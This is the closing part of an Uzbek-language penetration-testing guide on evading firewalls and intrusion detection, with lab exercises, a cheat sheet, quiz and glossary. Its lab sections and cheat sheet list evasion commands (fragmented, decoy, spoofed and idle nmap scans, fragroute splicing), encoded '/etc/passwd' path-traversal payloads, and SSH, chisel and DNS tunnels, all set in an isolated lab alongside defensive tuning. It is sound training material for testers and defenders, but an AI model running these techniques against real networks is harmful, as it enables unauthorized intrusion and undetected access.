- Fingerprint vositalari: honeypotlarning o‘ziga xos javoblarini qidiruvchi skriptlar; pivotdan keyin hostning haqiqiy foydalanuvchi faoliyati bor-yo‘qligini tekshirish.

> ⚠️ **PENTESTDA EHTIYOTKORLIK**
>
> Honeypot bilan faol «o‘ynash» SOC’ni darhol xabardor qiladi va sizning TTP’laringizni oshkor etadi. Red team’da honeypotni tanib, chetlab o‘tish ko‘pincha u bilan kurashishdan afzal. Topilgan honeypot/honeytoken’ni hisobotga kiriting: bu himoyachi uchun qimmatli ma’lumot.
>

### 13.3 Himoyachi tomoni

Honeypotlar imzo yoki anomaliyaga asoslangan IDS’ni almashtirmaydi, to‘ldiradi: ular «false negative» muammosini boshqa tomondan hal qiladi — e’tiborni haqiqiy, kam yolg‘on signalli hodisalarga qaratadi. Eng arzon va samarali boshlang‘ich qadam — honeytokenlar: ichki hujjatlarga, kod ombarlariga va ma’lumotlar bazalariga soxta kredensial va canary yozuvlarini joylash. Ulardan foydalanish urinishi deyarli har doim haqiqiy buzilish belgisidir.

## 14\. Himoya strategiyasi va hisobot

Oldingi bo‘limlarda har bir texnikaning himoyasi berildi. Bu bo‘lim ularni bir tizimga — qatlamli mudofaaga (defense in depth) — jamlaydi va pentest hisobotida tavsiyalarni qanday ifodalashni ko‘rsatadi.

### 14.1 Qatlamli mudofaa

| Qatlam | Asosiy choralar (bo‘lim) |
| --- | --- |
| **Perimetr** | Stateful firewall; ingress/egress filtrlash, BCP 38/uRPF (8.5); source routing’ni o‘chirish (7.3); fragment va IP options qoidalari (4.6, 7.3). |
| **Segmentatsiya** | VLAN’lar, mikrosegmentatsiya, DMZ; printer/IoT’ni ajratish (8.3); sharq-g‘arb (lateral) trafikni nazorat qilish. |
| **Sensor** | Target-based yig‘ish va normalizatsiya (2.4, 4.6, 5); to‘g‘ri sensor joylashuvi va TAP (1.4); sensor telemetriyasini kuzatish (11). |
| **Ilova** | WAF + normalizatsiya (10.4); parametrlashtirilgan so‘rovlar; kanonik yo‘llar; kirishni validatsiya. |
| **Host** | HIDS/EDR, host firewall, fayl yaxlitligi; shifr ochilgandan keyingi ko‘rinish (1.1). |
| **Identifikatsiya** | IP’ga emas, kuchli autentifikatsiyaga tayanish (8.5); mTLS, Kerberos, imzolangan tokenlar. |
| **Monitoring** | NSM (Zeek), NTA, SIEM korrelyatsiyasi, honeytokenlar (13.3); chiqish (egress) tahlili (9). |

### 14.2 Sensorni sozlash tamoyillari

- **Target-based.** Himoyalanayotgan hostlarning OS siyosatini sensorga bering (4.6, 5). Bu yagona eng muhim sozlama: insertion/evasion’ning katta qismini yopadi.
- **Normalizatsiya.** Imkon bo‘lsa inline normalizatsiya (pf `scrub`, Snort `normalizer`); bo‘lmasa, noaniqlik haqida alert.
- **Anomaliyani ham, imzoni ham.** Evasion urinishining o‘zi (overlap, mayda fragment, IP options, noto‘g‘ri checksum) kuchli signal — ularga qoida qo‘ying.
- **Protokol loglari.** Zeek `conn`, `dns`, `ssl`, `weird` loglari tunnellash va anomaliyani imzosiz ham ko‘rsatadi.
- **Baseline va chidamlilik.** Normal trafik profili; sensor drop/CPU ko‘rsatkichlariga alert (11).
- **Doimiy sinov.** Evasion texnikalarini (bu qo‘llanmadagilar) muntazam o‘tkazib, qoidalar hali ham ishlashini tekshiring (purple team).

### 14.3 Hisobotda topilmani ifodalash

Pentest topilmasi faqat «X ishladi» emas. Har bir topilma uchun:

1. **Nima sinaldi** — aniq buyruq, vaqt, manba IP (A/B test, 6.7).
2. **Kuzatilgan natija** — port holati, javob, va (mijoz loglari bilan) IDS alert berdimi.
3. **Ta’sir** — bu nimani anglatadi (masalan, «stateless filtr ACK’ni o‘tkazadi» → ichki xizmatlar xaritalanishi mumkin).
4. **Tavsiya** — tegishli himoya bo‘limiga asoslangan aniq sozlama yoki qoida.
5. **Tekshirish** — tuzatishdan keyin qanday qayta sinash mumkin.

> ℹ️ **NAMUNA TOPILMA**
>
> **Sarlavha:** Perimetr filtri stateless — ACK skan ichki xizmatlarni oshkor qiladi. 

**Dalil:** `nmap -sS` → 445/tcp filtered; `nmap -sA` → 445/tcp unfiltered (14:05, 203.0.113.10 dan). SOC loglarida mos alert yo‘q. 

**Ta’sir:** Filtr ulanish holatini kuzatmaydi; ACK/FIN/NULL skanlari orqali qoidalar xaritalanadi va mayda fragmentlar L4 sarlavhasisiz o‘tishi mumkin. 

**Tavsiya:** Perimetrda stateful qoidalar; `established` ACL o‘rniga conntrack; fragment qayta yig‘ish (4.6); ACK anomaliyasiga IDS qoidasi. 

**Tekshirish:** Tuzatishdan keyin `nmap -sA -p 445` «filtered» berishi va mos alert chiqishi kerak.
>

## 15\. Laboratoriya mashqlari

> ⚖️ **FAQAT O‘Z LABORATORIYANGIZDA**
>
> Barcha mashqlar o‘zingiz qurgan, internetdan ajratilgan (host-only yoki NAT) virtual tarmoqda bajariladi. Hech qanday mashqni o‘zingizga tegishli bo‘lmagan tizimga qaratmang.
>

### 15.1 Stend qurilishi

Tavsiya etilgan minimal stend (VirtualBox yoki VMware, host-only tarmoq `10.10.10.0/24`):

| Rol | Tavsiya | IP (misol) |
| --- | --- | --- |
| Hujumchi | Kali yoki Parrot | 10.10.10.5 |
| Firewall/marshrutizator | pfSense yoki OPNsense (2 interfeys) | 10.10.10.1 / 10.10.20.1 |
| IDS/IPS sensor | Security Onion yoki alohida Suricata+Zeek | 10.10.10.2 (SPAN) |
| Nishon (veb) | Metasploitable2/3, DVWA, yoki oddiy nginx | 10.10.20.10 |
| Nishon (Windows) | Windows lab VM | 10.10.20.20 |
| «Zombi» | Eski/oddiy Linux yoki IoT emulyatsiyasi | 10.10.10.30 |

Firewall’da SPAN/mirror portni sensor interfeysiga yo‘naltiring yoki sensorni ko‘prik (bridge) rejimida trafik yo‘liga qo‘ying. Har bir mashqdan oldin snapshot oling.

#### O‘lchash uskunasi

Har bir mashqda uch oynadan foydalaning: (1) hujumchida buyruq; (2) sensorda alertlar; (3) nishonda yoki yo‘lda tcpdump/Wireshark.

```bash
# Sensor: jonli alertlar
sudo tail -f /var/log/suricata/fast.log
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert") | {sig:.alert.signature, src:.src_ip}'
# Yo‘lda: faqat nishon trafigi
sudo tcpdump -ni eth0 host 10.10.20.10 -w mashq.pcap
```

### 15.2 Mashqlar

#### **[LAB 1]** Port holatlari va filtr xaritasi

SYN, ACK va Window skanlarni firewall ortidagi nishonga qarating; natijalarni solishtiring (3.1, 3.2). firewall’da avval stateless, keyin stateful qoida qo‘yib, farqni kuzating.

```bash
sudo nmap -sS -p 1-1000 --reason -n 10.10.20.10
sudo nmap -sA -p 1-1000 --reason -n 10.10.20.10
sudo nmap -sW -p 1-1000 --reason -n 10.10.20.10
```

**Yozib oling:** qaysi portlar SYN’da filtered, ACK’da unfiltered? Bu nimani anglatadi?

#### **[LAB 2]** Fragmentatsiya va yig‘ish siyosati

Bo‘lingan skan yuboring va sensor ularni qanday yig‘ishini kuzating (4.5, 4.6). Suricata `host-os-policy`’ni nishon OS’iga noto‘g‘ri sozlab, keyin to‘g‘rilab, alert farqini ko‘ring.

```bash
sudo nmap -sS -f -p 80,443 --packet-trace -n 10.10.20.10
sudo nmap -sS --mtu 24 -p 80,443 -n 10.10.20.10
sudo tcpdump -ni eth0 'ip[6:2] & 0x3fff != 0'   # bo‘laklar chiqayotganini tasdiqlang
```

#### **[LAB 3]** Session splicing (fragroute)

fragroute bilan HTTP so‘rovini mayda TCP segmentlarga bo‘lib, ma’lum imzoga ega so‘rov (masalan, `/etc/passwd`) sensordan o‘tadimi, tekshiring (5.1).

```bash
# ids.conf: tcp_seg 1 / order random / print
sudo fragroute -f ids.conf 10.10.20.10
# boshqa oynada:
curl "http://10.10.20.10/?file=/etc/passwd"
```

#### **[LAB 4]** Manba port ishonchi

firewall’da «manba port 53 dan hamma narsa o‘tadi» degan xato qoida yarating, so‘ng uni `-g 53` bilan aniqlang va ncat bilan foydalaning (6.3).

```bash
sudo nmap -sS -p 445 -n 10.10.20.20
sudo nmap -sS -g 53 -p 445 -n 10.10.20.20
ncat --source-port 53 10.10.20.20 445
```

#### **[LAB 5]** Decoy va TTL foshi

Decoy skan yuboring, so‘ng nishon pcap’ida barcha «skanerlar»ning TTL bir xilligini toping (8.1).

```bash
sudo nmap -sS -D 10.10.10.23,ME,10.10.10.41 -p 80 -n 10.10.20.10
# nishonda: TTL ustunini ko‘rish
sudo tcpdump -ni eth0 'tcp[tcpflags] & tcp-syn != 0' -v | grep ttl
```

#### **[LAB 6]** Idle (zombi) skan

Zombi nomzodini tekshiring va idle skan o‘tkazing; nishon pcap’ida faqat zombi IP ko‘rinishini tasdiqlang (8.3).

```bash
sudo nmap --script ipidseq -p 80 10.10.10.30
sudo nmap -Pn -sI 10.10.10.30:80 -p 22,80,445 10.10.20.10
```

#### **[LAB 7]** Timing va port-skan chegarasi

Sensorga «60 s ichida 15 port» chegarali qoida qo‘ying; `-T4` va `--scan-delay 5s` skanlarini solishtiring (6.2). Qaysi biri alert qo‘zg‘adi?

#### **[LAB 8]** WAF va HTTP normalizatsiya

ModSecurity + OWASP CRS o‘rnatilgan nginx’ga turli kodlangan so‘rovlarni yuboring (10.1); paranoia darajasini oshirib, farqni ko‘ring.

```bash
curl "http://10.10.20.10/?q=../../etc/passwd"
curl "http://10.10.20.10/?q=%252e%252e%252fetc%252fpasswd"
curl "http://10.10.20.10/?q=..%c0%af..%c0%afetc/passwd"
```

#### **[LAB 9]** SSH va chisel tunnel

Firewall faqat 22 yoki 443 chiqishga ruxsat bersin; tunnel orqali ichki segmentga yeting va sensor nimani ko‘rishini kuzating (9.3, 9.4).

```bash
ssh -D 1080 user@10.10.10.1
proxychains -q nmap -sT -Pn -n -p 80 10.10.30.10
# chisel bilan:
chisel server -p 8000 --reverse        # hujumchi
chisel client 10.10.10.5:8000 R:socks  # ichki host
```

#### **[LAB 10]** DNS tunnel va aniqlash

iodine yoki dnscat2 bilan DNS tunnel quring; Zeek `dns.log`’da uzun/entropiyali so‘rovlarni va hajm anomaliyasini toping (9.5).

```bash
# Zeek loglarini tahlil
cat dns.log | zeek-cut query | awk '{print length, $0}' | sort -rn | head
# bitta domenga so‘rovlar soni
cat dns.log | zeek-cut query | rev | cut -d. -f1-2 | rev | sort | uniq -c | sort -rn | head
```

### 15.3 Natijalar jadvali

Har bir mashq uchun to‘ldiring. Shu jadval pentest hisobotining xomashyosi.

| Lab | Buyruq / sozlama | Nmap natijasi | IDS alert? | Xulosa / tavsiya |
| --- | --- | --- | --- | --- |
| 1 |  |  |  |  |
| 2 |  |  |  |  |
| 3 |  |  |  |  |
| … |  |  |  |  |

## 16\. Tezkor ma’lumotnoma (cheat sheet)

### 16.1 Razvedka va aniqlash

```bash
nmap -sS -p- --reason -n T          # to‘liq SYN skan, sabab bilan
nmap -sA -p 1-1000 -n T             # stateful/stateless ajratish
nmap -sW -p 1-1000 -n T             # Window skan
nmap --script firewalk --traceroute T   # ruxsat etilgan portlar
nmap -sS --badsum -p 80,443 -n T    # yo‘ldagi qurilma
wafw00f https://T                   # WAF aniqlash
nmap -p443 --script http-waf-detect,http-waf-fingerprint T
traceroute -I T ; traceroute -T -p 443 T ; traceroute -U -p 53 T
```

### 16.2 Evasion parametrlari

```bash
nmap -sS -f T                       # 8-baytli fragmentlar
nmap -sS -ff T                      # 16-baytli
nmap -sS --mtu 24 T                 # 8 ga karrali
nmap -sS -D d1,d2,ME,d3 T           # decoy
nmap -sS -D RND:10 T                # 10 tasodifiy decoy
nmap -sS -S spoofIP -e eth0 -Pn T   # manba IP spoof
nmap -sS -g 53 T                    # manba port
nmap -sS --data-length 24 T         # payload qo‘shish
nmap -sS --ip-options "L a b c" T   # loose source route
nmap -sS --spoof-mac 0 T            # tasodifiy MAC
nmap -Pn -sI zombi:80 -p P T        # idle skan
nmap -sS -T1 --scan-delay 4s --max-retries 1 --randomize-hosts T
nmap -sN T ; nmap -sF T ; nmap -sX T   # NULL / FIN / Xmas
```

### 16.3 hping3

```bash
hping3 -S -p 80 -c 3 T              # SYN proba
hping3 -S -p 80 -f -c 3 T           # fragment
hping3 -S -s 53 -k -p 445 -c 3 T    # o‘zgarmas manba port 53
hping3 -S -a spoofIP -p 80 -c 3 T   # spoof
hping3 -S -p 80 -c 5 -r zombi       # IPID ketma-ketligi
```

### 16.4 fragroute qoidalari

```bash
ip_frag 8 old        # IP bo‘laklash (overlap: eski ustun)
ip_chaff dup         # soxta dublikat bo‘laklar
tcp_seg 1 new        # TCP segmentlash (session splicing)
tcp_chaff paws       # eski timestamp (host tashlaydi)
order random         # tartibni aralashtirish
print                # natijani ko‘rsatish
# ishga tushirish: sudo fragroute -f qoida.conf T
```

### 16.5 Tunnel va proksi

```bash
ssh -L 8080:ichki:80 user@jump      # lokal forward
ssh -R 9001:127.0.0.1:22 user@vps   # reverse
ssh -D 1080 user@jump               # SOCKS5
ssh -J user@jump user@ichki         # ProxyJump
chisel server -p 8000 --reverse     # + client ...:8000 R:socks
proxychains -q nmap -sT -Pn -n -p P T
torsocks curl -s https://check.torproject.org/api/ip
```

### 16.6 Himoyachi uchun

```bash
# Suricata jonli alert
tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")|.alert.signature'
# Zeek anomaliyalar / tunnel izlari
cat weird.log | zeek-cut name | sort | uniq -c | sort -rn
cat dns.log  | zeek-cut query | awk '{print length,$0}' | sort -rn | head
# Linux antispoofing
sysctl -w net.ipv4.conf.all.rp_filter=1
sysctl -w net.ipv4.conf.all.accept_source_route=0
sysctl -w net.ipv4.tcp_syncookies=1
# Faqat bo‘laklarni ushlash
tcpdump -ni eth0 'ip[6:2] & 0x3fff != 0'
```

T = nishon, P = portlar. Buyruqlarning aksariyati `sudo` talab qiladi.

## 17\. Nazorat savollari

Javoblar 17.1 da (teskari tomonda tekshiring).

1. Insertion va evasion o‘rtasidagi farq nima? Har biriga bitta misol keltiring.
2. Nima uchun `--mtu` qiymati 8 ga karrali bo‘lishi shart?
3. ACK skan nima uchun ochiq portlarni topa olmaydi, lekin baribir foydali?
4. SYN skanda «filtered», ACK skanda «unfiltered» natija nimani anglatadi?
5. Idle skan ishlashi uchun zombi qanday xususiyatga ega bo‘lishi kerak?
6. Decoy skanda haqiqiy manbani TTL orqali qanday fosh qilish mumkin?
7. Nmap `--proxies` port skanini nega anonimlashtirmaydi?
8. ProxyChains bilan nega `-sS` emas, `-sT` ishlatiladi?
9. Session splicing qanday IDS’ga qarshi ishlaydi va target-based yig‘ish uni qanday to‘sadi?
10. Ustma-ust fragmentlarda qaysi ma’lumot «g‘olib» bo‘lishini nima belgilaydi?
11. RFC 1858 tiny fragment hujumiga qanday qarshi chora taklif qiladi?
12. Manba port 53 ga asoslangan filtr xatosini qanday aniqlaysiz va amalda qanday foydalaniladi?
13. DNS tunnelni Zeek loglarida qaysi belgilar bo‘yicha topasiz?
14. TLS inspeksiyaning uch cheklovini ayting.
15. BCP 38 (ingress filtrlash) va uRPF o‘rtasida qanday bog‘liqlik bor?
16. Nega zamonaviy red team ko‘pincha paket darajasidagi evasion o‘rniga «oddiy trafikka singish»ni afzal ko‘radi?
17. Honeypotni real tizimdan ajratuvchi uch belgi qaysi?
18. Sensor `capture_loss`/`kernel_drops` ko‘rsatkichi nega xavfsizlik alertiga aylanishi kerak?
19. QUIC va ECH himoyachi uchun qanday muammo tug‘diradi?
20. Pentest topilmasi qanday besh qismdan iborat bo‘lishi kerak (14.3)?

### 17.1 Qisqa javoblar

1. Insertion: IDS qabul qiladi, host rad etadi (IDS ortiqcha bayt qo‘shadi). Evasion: host qabul qiladi, IDS rad etadi. Misollar: past TTL / IP options bilan tashlanadigan paket.
2. Fragment offset maydoni 8 baytlik birliklarda o‘lchanadi, shuning uchun o‘lcham 8 ga karrali bo‘lishi kerak.
3. U ochiq/yopiqni emas, filtr qoidalarini xaritalaydi: stateless filtr ACK’ni o‘tkazadi (unfiltered), stateful tashlaydi (filtered).
4. Stateless filtr: SYN bloklanadi, ACK (va ehtimol FIN/NULL/Xmas) o‘tadi.
5. Global, ketma-ket oshadigan IPID; trafigi kam (bo‘sh); sizdan va nishondan yetib boriladigan.
6. Barcha decoy paketlari bitta mashinadan chiqqani uchun bir xil TTL bilan yetadi; haqiqiy hostlar turlicha.
7. `--proxies` faqat NSE va versiya skanini o‘tkazadi; ping, port skan va OS aniqlash sizning IP’ingizdan ketadi.
8. ProxyChains OS soketini ushlaydi; `-sS` raw paket yuborib soketni chetlab o‘tadi, shuning uchun proksidan o‘tmaydi.
9. Oqimni yig‘maydigan yoki paketma-paket tekshiradigan IDS’ga; target-based yig‘ish payloadni hostdagidek birlashtirib, imzoni tiklaydi.
10. Qabul qiluvchi OS’ning yig‘ish siyosati (first/last/bsd/linux…).
11. TCP uchun fragment offset = 1 bo‘lgan bo‘laklarni tashlash (RFC 3128 overlap variantini qo‘shadi).
12. `-g 53` bilan oddiy skanni solishtirib; foydalanish uchun mijoz ham shu manba portdan ulanadi (`ncat --source-port 53`).
13. Uzun va yuqori entropiyali subdomenlar, bitta domenga ko‘p so‘rov, TXT/NULL ulushi, ko‘p NXDOMAIN.
14. Pinning qiladigan ilovalar buziladi; maxfiy toifalar (bank, tibbiyot) istisno; mijoz CA’ga ishonishi kerak.
15. uRPF — BCP 38 maqsadini (soxta manbani rad etish) amalga oshirishning avtomatik, marshrutga asoslangan usuli.
16. Paket anomaliyalari oddiy trafikda kam uchraydi va o‘zi alertga sabab bo‘ladi; «singish» esa ruxsat etilgan protokol va odatiy xatti-harakatdan foydalanadi.
17. Juda ko‘p «chiroyli» ochiq port; to‘liq bo‘lmagan xizmat javoblari; bir xil OS fingerprint; real foydalanuvchi faoliyati yo‘qligi.
18. Paket tashlagan sensor ko‘r bo‘ladi (false negative); drop ko‘rsatkichi himoyaning ishlamayotganini bildiradi.
19. QUIC — UDP/443 ustida shifrlangan transport, eski inspeksiya ko‘rmaydi; ECH SNI’ni shifrlab, URL filtrlashni zaiflashtiradi.
20. Nima sinaldi; kuzatilgan natija; ta’sir; tavsiya; tekshirish usuli.

## 18\. Lug‘at

| Atama | Izoh |
| --- | --- |
| IDS / IPS | Hujumni aniqlovchi / aniqlab, oldini oluvchi (inline) tizim. |
| NIDS / HIDS | Tarmoq / host darajasidagi IDS. |
| NSM | Network Security Monitoring — imzo emas, protokol loglari va tahlilga asoslangan kuzatuv (Zeek). |
| Imzo (signature) | Ma’lum hujum naqshi; IDS trafikni unga solishtiradi. |
| Anomaliya | Normal profildan og‘ishga asoslangan aniqlash. |
| Insertion | IDS qabul qiladigan, host rad etadigan paket orqali IDS yig‘ilmasini buzish. |
| Evasion | Host qabul qiladigan, IDS rad etadigan paket orqali IDS’dan yashirinish. |
| Target-based reassembly | IDS paketlarni himoyalanayotgan host OS’idek yig‘ishi. |
| Normalizatsiya | Inline qurilma noaniq trafikni bir ma’noli ko‘rinishga keltirishi (scrub). |
| Stateful / stateless | Ulanish holatini kuzatadigan / kuzatmaydigan filtr. |
| SPI | Stateful Packet Inspection. |
| NGFW | Next-Generation Firewall: L3–L7, App-ID, IPS, TLS inspeksiya. |
| WAF | Web Application Firewall — HTTP so‘rovlarini tekshiradi. |
| DMZ | Tashqi xizmatlar uchun ajratilgan oraliq tarmoq (screened subnet). |
| Bastion host | Hujumga ataylab qarshi qo‘yilgan, kuchaytirilgan host. |
| Fragment offset | IP bo‘lakning datagrammadagi o‘rni (8 baytlik birliklarda). |
| MF / DF | More Fragments / Don’t Fragment bayroqlari. |
| Session splicing | Payloadni juda mayda TCP segmentlarga bo‘lish. |
| Chaff | Host rad etadigan, lekin IDS qabul qiladigan soxta segmentlar bilan oqimni «ifloslantirish». |
| Decoy | Skanni niqoblash uchun soxta manbali qo‘shimcha paketlar. |
| IP spoofing | Manba IP manzilini soxtalashtirish. |
| Idle / zombi skan | Uchinchi hostning IPID oshishidan foydalangan ko‘r skan. |
| IPID | IP Identification maydoni; datagramma bo‘laklarini bog‘laydi. |
| Firewalking | TTL bilan firewall ortidagi ruxsat etilgan portlarni aniqlash. |
| Source routing | Jo‘natuvchi paket yo‘lini IP options’da ko‘rsatishi (LSRR/SSRR). |
| BCP 38 / uRPF | Soxta manbali paketlarni rad etuvchi ingress filtrlash / teskari yo‘l tekshiruvi. |
| ISN | TCP boshlang‘ich ketma-ketlik raqami (RFC 6528 — taxmin qilib bo‘lmasligi kerak). |
| PAWS | Protection Against Wrapped Sequences — eski timestampli segmentni tashlaydi. |
| SYN cookies | SYN flood’ga qarshi holatni saqlamaydigan usul. |
| Proksi / SOCKS | Ulanishni o‘zi orqali uzatuvchi vositachi; SOCKS5 TCP/UDP va DNS’ni qo‘llaydi. |
| Tunnellash | Bir protokol trafigini boshqa (ruxsat etilgan) protokol ichiga joylash. |
| DoH / DoT | DNS over HTTPS / over TLS — DNS’ni shifrlab, filtr va logdan yashiradi. |
| QUIC / ECH | UDP/443 ustidagi shifrlangan transport / shifrlangan ClientHello (SNI). |
| JA3 / JA4 | TLS mijoz/aloqa fingerprinti. |
| Honeypot / honeytoken | Soxta tizim / soxta kredensial; ularga murojaat deyarli har doim shubhali. |
| Beaconing | Zararli dasturning muntazam oraliqda boshqaruv serveriga ulanishi. |
| Fail-open / fail-closed | Inline qurilma ishdan chiqqanda trafikni o‘tkazishi / to‘xtatishi. |
| Base-rate fallacy | Hujumlar kamligi sababli aniq detektor ham ko‘p yolg‘on signal berishi. |

## 19\. Manbalar va keyingi o‘qish

#### Asosiy maqolalar

- Ptacek, T. & Newsham, T. (1998). *Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection.* — sohaning asosiy ishi.
- Handley, M., Paxson, V. & Kreibich, C. (2001). *Network Intrusion Detection: Evasion, Traffic Normalization, and End-to-End Protocol Semantics.* USENIX Security.
- Shankar, U. & Paxson, V. (2003). *Active Mapping: Resisting NIDS Evasion Without Altering Traffic.* IEEE S&P.
- Novak, J. (2005). *Target-Based Fragmentation Reassembly.* Sourcefire.
- Axelsson, S. (2000). *The Base-Rate Fallacy and the Difficulty of Intrusion Detection.* ACM TISSEC.
- Goldsmith, D. & Schiffman, M. (1998). *Firewalking.*
- Jin, C., Wang, H. & Shin, K. (2003). *Hop-Count Filtering: An Effective Defense Against Spoofed DDoS Traffic.* ACM CCS.
- antirez (1998). Idle scan g‘oyasi (Bugtraq); Phrack 60-son, 12-maqola (`--badsum` texnikasi).

#### Standartlar (RFC)

- RFC 791 — IPv4; RFC 793 / 9293 — TCP.
- RFC 1858 / 3128 — tiny fragment hujumi va himoyasi.
- RFC 8200 — IPv6; RFC 5722 — ustma-ust bo‘laklarni taqiqlash.
- RFC 7112 — IPv6 sarlavha zanjiri birinchi bo‘lakda.
- RFC 5095 — IPv6 RH0 bekor qilinishi; RFC 8754 — SRv6.
- RFC 2827 (BCP 38) / RFC 3704 (BCP 84) — ingress filtrlash, uRPF.
- RFC 6528 — taxmin qilib bo‘lmaydigan ISN; RFC 5961 — TCP RST/SYN qat’iyligi.
- RFC 7323 — TCP timestamp va PAWS; RFC 6093 — URG.
- RFC 7126 — IP options’ni filtrlash bo‘yicha tavsiyalar.

#### Hujjatlar va vositalar

- Nmap: [Firewall/IDS Evasion and Spoofing](https://nmap.org/book/man-bypass-firewalls-ids.html); [Idle Scan](https://nmap.org/book/idle-scan.html); [Port Scanning Techniques](https://nmap.org/book/man-port-scanning-techniques.html).
- Suricata hujjatlari: `defrag`, `host-os-policy`, `stream`, libhtp sozlamalari.
- Snort 3 hujjatlari: `stream_ip`, `stream_tcp`, `http_inspect`, `normalizer`.
- Zeek hujjatlari: `conn`, `dns`, `ssl`, `weird` loglari, `capture_loss`.
- OWASP CRS va ModSecurity qo‘llanmalari; PortSwigger: HTTP Request Smuggling tadqiqotlari.
- fragroute (Dug Song), hping3, Scapy, chisel, ligolo-ng, iodine, dnscat2 hujjatlari.
- MITRE ATT&CK: Defense Evasion (TA0005), Command and Control (TA0011) taktikalari.

> ℹ️ **YAKUNIY SO‘Z**
>
> Bu qo‘llanmadagi har bir hujum usuli bitta maqsadga xizmat qiladi: himoyani sinab, uni mustahkamlash. Eng yaxshi natija — texnikani ishlatib, keyin uni ishlamaydigan qilib sozlash. Himoyachi sifatida har bir bo‘limdagi «HIMOYA» qutilarini amalga oshiring; pentester sifatida har bir topilmani 14.3 dagi tuzilma bo‘yicha hujjatlang. Va har doim: faqat ruxsat bilan.
>
